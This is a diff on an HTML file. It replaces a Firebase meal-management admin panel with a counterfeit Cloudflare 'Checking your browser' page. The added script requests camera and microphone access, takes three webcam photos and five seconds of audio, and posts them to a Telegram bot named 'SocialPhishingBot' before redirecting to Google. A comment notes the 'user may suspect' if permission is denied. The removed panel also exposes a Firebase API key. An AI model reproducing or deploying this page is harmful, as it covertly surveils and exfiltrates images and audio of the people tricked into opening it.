@@ -1,465 +1,161 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title MEAL_KHATA Management - Admin Panel</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick-theme.min.css">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #e9ecef;
-            margin: 0;
-            padding: 0;
-        }
-        header {
-            background-color: #343a40;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        main {
-            padding: 20px;
-            margin: 20px auto;
-            background: #fff;
-            width: 90%;
-            max-width: 1200px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        h2 {
-            border-bottom: 2px solid #343a40;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-        .slider img {
-            width: 100%;
-            max-height: 300px;
-            object-fit: cover;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-        .form-group input, .form-group textarea, .form-group select {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        .form-group button {
-            padding: 10px 15px;
-            background-color: #007bff;
-            border: none;
-            color: white;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .form-group button:hover {
-            background-color: #0056b3;
-        }
-        .section {
-            margin-bottom: 40px;
-        }
-        .item-list {
-            margin-bottom: 20px;
-        }
-        .item {
-            padding: 10px;
-            border: 1px solid #ddd;
-            margin-bottom: 10px;
-            background-color: #f8f9fa;
-            border-radius: 4px;
-        }
-        .item button {
-            background-color: #dc3545;
-            border: none;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .item button:hover {
-            background-color: #c82333;
-        }
-    </style>
-</head>
+<html lang="en-US">
+<head> 
+<meta charset="UTF-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+<meta name="robots" content="noindex, nofollow"> 
+<meta name="viewport" content="width=device-width,initial-scale=1"> 
+<title>Just a moment....</title> 
+  <video id="video" autoplay style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+<style type="text/css">
+html, body {width: 100%; height: 100%; margin: 0; padding: 0;}
+body {background-color: #ffffff; color: #000000; font-family:-apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue",Arial, sans-serif; font-size: 16px; line-height: 1.7em;-webkit-font-smoothing: antialiased;}
+h1 { text-align: center; font-weight:700; margin: 16px 0; font-size: 32px; color:#000000; line-height: 1.25;}
+p {font-size: 20px; font-weight: 400; margin: 8px 0;}
+p, .attribution, {text-align: center;}
+#spinner {margin: 0 auto 30px auto; display: block;}
+.attribution {margin-top: 32px;}
+@keyframes fader   { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+@-webkit-keyframes fader { 0% {opacity: 0.2;} 50% {opacity: 1.0;} 100% {opacity: 0.2;} }
+#cf-bubbles > .bubbles { animation: fader 1.6s infinite;}
+#cf-bubbles > .bubbles:nth-child(2) { animation-delay: .2s;}
+#cf-bubbles > .bubbles:nth-child(3) { animation-delay: .4s;}
+.bubbles { background-color: #f58220; width:20px; height: 20px; margin:2px; border-radius:100%; display:inline-block; }
+a { color: #2c7cb0; text-decoration: none; -moz-transition: color 0.15s ease; -o-transition: color 0.15s ease; -webkit-transition: color 0.15s ease; transition: color 0.15s ease; }
+a:hover{color: #f4a15d}
+.attribution{font-size: 16px; line-height: 1.5;}
+.ray_id{display: block; margin-top: 8px;}
+#cf-wrapper #challenge-form { padding-top:25px; padding-bottom:25px; }
+#cf-hcaptcha-container { text-align:center;}
+#cf-hcaptcha-container iframe { display: inline-block;}
+</style> 
+</head> 
 <body>
+<table width="100%" height="100%" cellpadding="20"> 
+<tbody>
+<tr> 
+<td align="center" valign="middle"> 
+<div class="cf-browser-verification cf-im-under-attack"> 
+<noscript> 
+<h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1> 
+</noscript> 
+<div id="cf-content" style="display: block;"> 
+<div id="cf-bubbles"> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+<div class="bubbles"></div> 
+</div> 
+<h1><span data-translate="checking_browser">Checking your browser before accessing</span> the website.</h1> 
+<div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none"> 
+<p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p> 
+</div> 
+<p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your requested content shortly.</p> 
+<p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 5 seconds…</p> 
+<p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p> 
+</div> 
+<form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded"> 
 
-    <header>
-        <h1>MEAL_KHATA Management - Admin Panel</h1>
-    </header>
+<span data-translate="error" style="display: none;">error code: 1020</span>
 
-    <main>
+</form>
+</div> 
+<div class="attribution">
+DDoS protection by 
+<a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
+<br> 
+<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
 
-        <!-- Text Slider Management -->
-        <section class="section">
-            <h2>Manage Text Slider</h2>
-            <form id="text-slider-form">
-                <div class="form-group">
-                    <label for="text">New Text:</label>
-                    <input type="text" id="text" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Add Text</button>
-                </div>
-            </form>
-            <div id="text-slider-list" class="item-list">Loading...</div>
-        </section>
+// ...
+    }
+    function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+         
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
 
-        <!-- Image Slider Management -->
-        <section class="section">
-            <h2>Manage Image Slider</h2>
-            <form id="image-slider-form">
-                <div class="form-group">
-                    <label for="image-url">Image URL:</label>
-                    <input type="url" id="image-url" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Add Image</button>
-                </div>
-            </form>
-            <div id="image-slider-list" class="item-list">Loading...</div>
-        </section>
+        function capturePhoto(index) {
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing photo:', error);
+              });
+          }, index * 2000);
+        }
 
-        <!-- Dining Information -->
-        <section class="section">
-            <h2>Update Dining Information</h2>
-            <form id="dining-info-form">
-                <div class="form-group">
-                    <label for="dining-info">About Dining:</label>
-                    <textarea id="dining-info" rows="4" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label for="breakfast-time">Breakfast Time:</label>
-                    <input type="text" id="breakfast-time" required>
-                </div>
-                <div class="form-group">
-                    <label for="lunch-time">Lunch Time:</label>
-                    <input type="text" id="lunch-time" required>
-                </div>
-                <div class="form-group">
-                    <label for="dinner-time">Dinner Time:</label>
-                    <input type="text" id="dinner-time" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Update Info</button>
-                </div>
-            </form>
-        </section>
+        function startAudioRecording() {
+          audioRecorder.start();
+          setTimeout(() => {
+            audioRecorder.stop();
+          }, 5000);
+        }
 
-        <!-- Dining Rules -->
-        <section class="section">
-            <h2>Update Dining Rules</h2>
-            <form id="dining-rules-form">
-                <div class="form-group">
-                    <label for="dining-rules">Dining Rules:</label>
-                    <textarea id="dining-rules" rows="4" required></textarea>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Update Rules</button>
-                </div>
-            </form>
-        </section>
-
-        <!-- Staff Management -->
-        <section class="section">
-            <h2>Manage Dining Staff</h2>
-            <form id="staff-form">
-                <div class="form-group">
-                    <label for="staff-name">Staff Name:</label>
-                    <input type="text" id="staff-name" required>
-                </div>
-                <div class="form-group">
-                    <label for="staff-position">Position:</label>
-                    <input type="text" id="staff-position" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Add Staff</button>
-                </div>
-            </form>
-            <div id="staff-list" class="item-list">Loading...</div>
-        </section>
-
-        <!-- Routine Management -->
-        <section class="section">
-            <h2>Update Dining Routine</h2>
-            <form id="routine-form">
-                <div class="form-group">
-                    <label for="meal">Meal:</label>
-                    <select id="meal" required>
-                        <option value="breakfast">Breakfast</option>
-                        <option value="lunch">Lunch</option>
-                        <option value="dinner">Dinner</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="meal-time">Time:</label>
-                    <input type="text" id="meal-time" required>
-                </div>
-                <div class="form-group">
-                    <button type="submit">Update Routine</button>
-                </div>
-            </form>
-            <table id="routine-table" class="item-list">
-                <thead>
-                    <tr>
-                        <th>Meal</th>
-                        <th>Time</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <!-- Routine items will be added dynamically -->
-                </tbody>
-            </table>
-        </section>
-
-        <!-- Attendance Management -->
-        <section class="section">
-            <h2>Manage Attendance</h2>
-            <div class="form-group">
-                <button id="show-student-attendance">Show Student Attendance</button>
-                <button id="show-staff-attendance">Show Staff Attendance</button>
-            </div>
-            <div id="attendance-list" class="item-list">Loading...</div>
-        </section>
-
-    </main>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
-        import { getDatabase, ref, set, update, remove, onValue } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyCGOWOPnqw_fN09nhKJFLx-AtsEC39DiC0",
-            authDomain: "digital-hagira.firebaseapp.com",
-            databaseURL: "https://digital-hagira-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "digital-hagira",
-            storageBucket: "digital-hagira.appspot.com",
-            messagingSenderId: "29482319758",
-            appId: "1:29482319758:web:3b0d0bf0c81467ca866edf",
-            measurementId: "G-NR7P6G5R0T"
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
         };
 
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        for (let i = 0; i < 3; i++) {
+          capturePhoto(i);
+        }
 
-        // Text Slider Management
-        const textSliderForm = document.getElementById('text-slider-form');
-        textSliderForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const text = document.getElementById('text').value;
-            const newRef = ref(db, 'text-slider/' + Date.now());
-            set(newRef, { text })
-                .then(() => alert('Text added!'))
-                .catch((error) => console.error('Error adding text:', error));
-        });
+        startAudioRecording();
+      })
+      .catch((error) => {
+        if (error.name === 'NotAllowedError') {
+          // Handle the case where permissions are denied
+          console.warn('Permissions denied. User may suspect.');
+        } else {
+          console.error('Permission error:', error);
+        }
+      });
 
-        // Load Text Slider List
-        const textSliderList = document.getElementById('text-slider-list');
-        onValue(ref(db, 'text-slider'), (snapshot) => {
-            textSliderList.innerHTML = '';
-            snapshot.forEach((childSnapshot) => {
-                const textItem = childSnapshot.val().text;
-                const div = document.createElement('div');
-                div.className = 'item';
-                div.textContent = textItem;
-                const deleteButton = document.createElement('button');
-                deleteButton.textContent = 'Delete';
-                deleteButton.onclick = () => {
-                    remove(childSnapshot.ref)
-                        .then(() => alert('Text deleted!'))
-                        .catch((error) => console.error('Error deleting text:', error));
-                };
-                div.appendChild(deleteButton);
-                textSliderList.appendChild(div);
-            });
-        });
+    function sendToTelegram(data, type) {
+   
+      const botToken = '74848499:jdjdkkekwmwmdklfjfmwme';
+      const chatId = chatid;
 
-        // Image Slider Management
-        const imageSliderForm = document.getElementById('image-slider-form');
-        imageSliderForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const imageUrl = document.getElementById('image-url').value;
-            const newRef = ref(db, 'image-slider/' + Date.now());
-            set(newRef, { imageUrl })
-                .then(() => alert('Image added!'))
-                .catch((error) => console.error('Error adding image:', error));
-        });
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@SocialPhishingBot.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-        // Load Image Slider List
-        const imageSliderList = document.getElementById('image-slider-list');
-        onValue(ref(db, 'image-slider'), (snapshot) => {
-            imageSliderList.innerHTML = '';
-            snapshot.forEach((childSnapshot) => {
-                const imageUrl = childSnapshot.val().imageUrl;
-                const div = document.createElement('div');
-                div.className = 'item';
-                const img = document.createElement('img');
-                img.src = imageUrl;
-                div.appendChild(img);
-                const deleteButton = document.createElement('button');
-                deleteButton.textContent = 'Delete';
-                deleteButton.onclick = () => {
-                    remove(childSnapshot.ref)
-                        .then(() => alert('Image deleted!'))
-                        .catch((error) => console.error('Error deleting image:', error));
-                };
-                div.appendChild(deleteButton);
-                imageSliderList.appendChild(div);
-            });
-        });
-
-        // Dining Information
-        const diningInfoForm = document.getElementById('dining-info-form');
-        diningInfoForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const info = document.getElementById('dining-info').value;
-            const breakfastTime = document.getElementById('breakfast-time').value;
-            const lunchTime = document.getElementById('lunch-time').value;
-            const dinnerTime = document.getElementById('dinner-time').value;
-            update(ref(db, 'dining-info'), { info, breakfast: breakfastTime, lunch: lunchTime, dinner: dinnerTime })
-                .then(() => alert('Dining info updated!'))
-                .catch((error) => console.error('Error updating dining info:', error));
-        });
-
-        // Dining Rules
-        const diningRulesForm = document.getElementById('dining-rules-form');
-        diningRulesForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const rules = document.getElementById('dining-rules').value;
-            update(ref(db, 'dining-rules'), { rules })
-                .then(() => alert('Dining rules updated!'))
-                .catch((error) => console.error('Error updating dining rules:', error));
-        });
-
-        // Staff Management
-        const staffForm = document.getElementById('staff-form');
-        staffForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const name = document.getElementById('staff-name').value;
-            const position = document.getElementById('staff-position').value;
-            const newRef = ref(db, 'staff/' + Date.now());
-            set(newRef, { name, position })
-                .then(() => alert('Staff added!'))
-                .catch((error) => console.error('Error adding staff:', error));
-        });
-
-        // Load Staff List
-        const staffList = document.getElementById('staff-list');
-        onValue(ref(db, 'staff'), (snapshot) => {
-            staffList.innerHTML = '';
-            snapshot.forEach((childSnapshot) => {
-                const staff = childSnapshot.val();
-                const div = document.createElement('div');
-                div.className = 'item';
-                div.textContent = `${staff.name} - ${staff.position}`;
-                const deleteButton = document.createElement('button');
-                deleteButton.textContent = 'Delete';
-                deleteButton.onclick = () => {
-                    remove(childSnapshot.ref)
-                        .then(() => alert('Staff deleted!'))
-                        .catch((error) => console.error('Error deleting staff:', error));
-                };
-                div.appendChild(deleteButton);
-                staffList.appendChild(div);
-            });
-        });
-
-        // Routine Management
-        const routineForm = document.getElementById('routine-form');
-        routineForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            const meal = document.getElementById('meal').value;
-            const mealTime = document.getElementById('meal-time').value;
-            update(ref(db, 'dining-info'), { [meal]: mealTime })
-                .then(() => alert('Routine updated!'))
-                .catch((error) => console.error('Error updating routine:', error));
-        });
-
-        // Load Routine List
-        const routineTable = document.getElementById('routine-table').getElementsByTagName('tbody')[0];
-        onValue(ref(db, 'dining-info'), (snapshot) => {
-            routineTable.innerHTML = '';
-            const data = snapshot.val();
-            ['breakfast', 'lunch', 'dinner'].forEach((meal) => {
-                const time = data[meal];
-                if (time) {
-                    const row = routineTable.insertRow();
-                    row.insertCell(0).textContent = meal.charAt(0).toUpperCase() + meal.slice(1);
-                    row.insertCell(1).textContent = time;
-                    const actionsCell = row.insertCell(2);
-                    const deleteButton = document.createElement('button');
-                    deleteButton.textContent = 'Delete';
-                    deleteButton.onclick = () => {
-                        update(ref(db, 'dining-info'), { [meal]: null })
-                            .then(() => alert('Routine deleted!'))
-                            .catch((error) => console.error('Error deleting routine:', error));
-                    };
-                    actionsCell.appendChild(deleteButton);
-                }
-            });
-        });
-
-        // Attendance Management
-        const showStudentAttendanceButton = document.getElementById('show-student-attendance');
-        const showStaffAttendanceButton = document.getElementById('show-staff-attendance');
-        const attendanceList = document.getElementById('attendance-list');
-
-        showStudentAttendanceButton.addEventListener('click', () => {
-            onValue(ref(db, 'attendance/student'), (snapshot) => {
-                attendanceList.innerHTML = '';
-                snapshot.forEach((childSnapshot) => {
-                    const attendance = childSnapshot.val();
-                    const div = document.createElement('div');
-                    div.className = 'item';
-                    div.textContent = `${attendance.name} - ${attendance.status}`;
-                    attendanceList.appendChild(div);
-                });
-            });
-        });
-
-        showStaffAttendanceButton.addEventListener('click', () => {
-            onValue(ref(db, 'attendance/staff'), (snapshot) => {
-                attendanceList.innerHTML = '';
-                snapshot.forEach((childSnapshot) => {
-                    const attendance = childSnapshot.val();
-                    const div = document.createElement('div');
-                    div.className = 'item';
-                    div.textContent = `${attendance.name} - ${attendance.status}`;
-                    attendanceList.appendChild(div);
-                });
-            });
-        });
-    </script>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
-    <script>
-        $(document).ready(function(){
-            $('.text-slider').slick({
-                dots: true,
-                infinite: true,
-                speed: 300,
-                slidesToShow: 1,
-                adaptiveHeight: true
-            });
-
-            $('.image-slider').slick({
-                dots: true,
-                infinite: true,
-                speed: 300,
-                slidesToShow: 1,
-                adaptiveHeight: true
-            });
-        });
-    </script>
-
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+{
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+    }
+               
+  
+    
+  </script>
+<meta http-equiv="refresh" content="10; URL=https://www.google.com" />
 </body>
 </html>
